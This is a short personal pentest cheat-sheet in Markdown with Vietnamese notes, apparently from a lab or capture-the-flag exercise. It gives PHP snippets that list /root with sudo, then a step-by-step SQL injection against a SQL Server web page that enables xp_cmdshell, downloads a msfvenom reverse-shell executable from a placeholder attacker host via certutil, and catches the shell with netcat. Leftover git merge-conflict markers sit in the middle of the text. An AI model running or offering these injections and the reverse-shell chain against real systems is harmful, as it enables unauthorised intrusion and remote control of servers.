### Python
### PHP
```
<?php
$dir = '/root';
$files = scandir($dir);
print_r($files);
?>
```

```
<?php
$command = 'sudo ls /root'; 
$output = exec($command);
echo "$output";
?>
```
<<<<<<< HEAD
=======
- Reverse shell thông qua sqli trong sql server

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

`http://10.201.32.247/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --`: mở config cho proc hệ thống xp_cmdshell

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe`: tạo payload 
`python3 -m http.server 8000`: mở server
`http://10.201.32.247/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --`: download payload đang có trên server vừa mở
`nc -lnvp 4444`: mở listener trên máy mình
`http://10.201.32.247/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --`: chạy reserve shell
>>>>>>> origin/main

https://pentestmonkey.net/category/cheat-sheet
